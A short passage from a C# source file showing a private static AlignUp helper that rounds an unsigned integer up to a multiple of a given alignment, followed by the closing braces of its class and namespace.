        private static uint AlignUp(uint value, uint alignment) =>
            ((value + alignment - 1) / alignment) * alignment;
    }
}
